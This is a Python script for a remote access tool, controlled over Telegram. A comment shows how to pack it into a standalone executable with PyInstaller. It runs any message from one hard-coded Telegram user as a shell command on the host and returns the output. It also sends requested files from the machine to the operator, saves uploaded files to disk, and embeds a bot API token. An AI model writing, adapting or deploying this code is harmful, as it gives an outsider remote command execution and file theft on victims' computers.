'''
pip install -U pyinstaller

pyinstaller --onefile myscript.py
'''
import telebot
import subprocess
BOT_API_KEY = "7860835594:AAFnmHlf1AVFKQ6fKGr0UaYgwhNj-J95cZ0"
telegram_user_id = 526626246
bot = telebot.TeleBot(BOT_API_KEY)
def verify_telegram_id(id):
    return telegram_user_id == id
def execute_system_command(cmd):
    max_message_length = 2048
    output = subprocess.getstatusoutput(cmd)
    if len(output[1]) > max_message_length:
        return str(output[1][:max_message_length])

    return str(output[1])
# Start bot
@bot.message_handler(commands=['start'])
def begin(message):
    if not verify_telegram_id(message.from_user.id):
        return
    hostname = execute_system_command("hostname")
    current_user = execute_system_command("whoami")
    response = f"Running as: {hostname}/{current_user}"
    bot.reply_to(message, response)
# Download a file
@bot.message_handler(commands=['downloadFile'])
def download_file(message):
    if not verify_telegram_id(message.from_user.id):
        return
    if len(message.text.split(' ')) != 2:
        return
    file_path = message.text.split(' ')[1]
    try:
        with open(file_path, "rb") as file:
            bot.send_document(message.from_user.id, file)
            bot.reply_to(message, "[+] File downloaded")
    except:
        bot.reply_to(message, "[!] Unsuccessful")
# Handle document uploads
@bot.message_handler(content_types=['document'])
def handle_document_upload(message):
    if not verify_telegram_id(message.from_user.id):
        return
    try:
        if message.document:
            # Get file id and name
            file_id = message.document.file_id
            file_name = message.document.file_name

            # Download file
            file_info = bot.get_file(file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            with open(f"./{file_name}", "wb") as file:
                file.write(downloaded_file)

            bot.reply_to(message, "[+] Upload successful")
    except:
        bot.reply_to(message, "[!] Unsuccessful")
# Handle any command
@bot.message_handler()
def handle_any_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    if message.text.startswith("/start"):
        return
    response = execute_system_command(message.text)
    bot.reply_to(message, response)
bot.infinity_polling()
